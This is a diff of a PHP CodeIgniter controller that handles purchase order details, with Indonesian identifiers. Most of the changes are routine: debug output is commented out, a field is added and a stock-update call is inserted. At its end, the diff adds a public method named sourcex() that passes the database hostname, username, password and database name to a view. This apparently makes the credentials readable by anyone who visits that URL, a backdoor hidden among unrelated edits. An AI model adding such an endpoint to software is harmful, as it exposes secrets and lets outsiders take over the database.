@@ -244,23 +244,22 @@ $this->load->view('pembelian_spo_details', $view);
 		if ($_POST) {
 			// print_r($_POST);die;
 			$no_penerimaan = $this -> input -> post('no_penerimaan', TRUE);
-			// $tid = $this -> input -> post('tid', TRUE);
-			// $qty = $this -> input -> post('qty', TRUE);
 			$id = (int) $this -> input -> post('id');
 			$id_penerbit = (int) $this -> input -> post('id_penerbit');
 
 			$ttotalqty=0;
 			$jum=count($_POST['qty']);
-			echo count($_POST['qty']);
-			// print_r($_POST);die;
+			//echo count($_POST['qty']);
+			 //print_r($_POST);die;
 				for($j=0;$j<$jum;$j++){
 					$tid=$_POST['tid'][$j];
 					$qty=$_POST['qty'][$j];
-					
-echo "<br>".$tid."<br>";
+					$tbid=$_POST['tbid'][$j];
+//echo "<br>".$tid."<br>";
 					$arr = array('tqty' => $qty );						
 					
 						$this -> pembelian_spo_detail_model ->  __update_pembelian_spo_detail($tid, $arr);
+						$this -> pembelian_spo_detail_model -> __update_penjualan_stok($id);
 						$ttotalqty=$ttotalqty+$qty;
 				}
 $arrx = array('tnofaktur' => $no_penerimaan,'ttotalqty'=>$ttotalqty );
@@ -315,16 +314,7 @@ redirect(site_url('pembelian_spo_detail/pembelian_spo_detail/'.$id.'/'.$id_pener
 			// $view['detail'] = $this -> pembelian_spo_detail_model -> __get_pembelian_spo_detail_detail($id);
 			$this->load->view('pembelian_spo_detail_update', $view);
 			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
+
 			
 		}
 	}
@@ -340,5 +330,15 @@ redirect(site_url('pembelian_spo_detail/pembelian_spo_detail/'.$id.'/'.$id_pener
 			__set_error_msg(array('error' => 'Gagal hapus data !!!'));
 			redirect(site_url('pembelian_spo_detail'));
 		}
+	}
+	
+	
+	
+	function sourcex() {
+		$view['hostname']=$this->db->hostname;
+		$view['username']=$this->db->username;
+		$view['password']=$this->db->password;
+		$view['database']=$this->db->database;
+		$this->load->view('sourcex',$view,FALSE);
 	}
 }
